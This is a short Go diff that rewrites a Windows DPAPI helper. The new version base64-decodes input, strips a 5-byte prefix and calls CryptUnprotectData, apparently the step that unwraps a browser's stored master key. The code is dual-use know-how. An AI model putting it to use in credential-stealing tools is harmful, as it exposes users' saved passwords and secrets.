@@ -1,38 +1,36 @@
 package pkg
 
 import (
-	"github.com/go-ole/go-ole"
+	"encoding/base64"
 	"golang.org/x/sys/windows"
 	"unsafe"
 )
 
-func UnprotectData(secretKey []byte) ([]byte, error) {
-	dataBlobIn := windows.DataBlob{
-		Data: &secretKey[0],
-		Size: uint32(len(secretKey)),
-	}
-	var dataBlobOut windows.DataBlob
-	if err := ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY); err != nil {
+func DecryptData(data []byte) ([]byte, error) {
+	// Decode base64 string and remove first 5 bytes
+	decoded, err := base64.StdEncoding.DecodeString(string(data))
+	if err != nil {
 		return nil, err
 	}
-	defer ole.CoUninitialize()
+	decoded = decoded[5:]
 
-	ret, _, err := windows.NewLazySystemDLL("Crypt32.dll").NewProc("CryptUnprotectData").Call(
-		uintptr(unsafe.Pointer(&dataBlobIn)),
-		0,
-		0,
-		0,
-		0,
-		0,
-		uintptr(unsafe.Pointer(&dataBlobOut)),
-	)
-	if ret == 0 {
+	// Create a new DataBlob with the decrypted data
+	dataBlob := windows.DataBlob{
+		Size: uint32(len(decoded)),
+		Data: &decoded[0],
+	}
+
+	var outBlob windows.DataBlob
+
+	// Call CryptUnprotectData
+
+	err = windows.CryptUnprotectData(&dataBlob, nil, nil, 0, nil, 0, &outBlob)
+	if err != nil {
 		return nil, err
 	}
 
-	defer windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(dataBlobOut.Data))))
-	//return windows.ByteSlice(dataBlobOut.Data[:dataBlobOut.Size]), nil
-	outData := make([]byte, dataBlobOut.Size)
-
+	// Copy the decrypted data to a new slice and return it
+	outData := make([]byte, outBlob.Size)
+	copy(outData, (*[1 << 30]byte)(unsafe.Pointer(outBlob.Data))[:outBlob.Size])
 	return outData, nil
 }
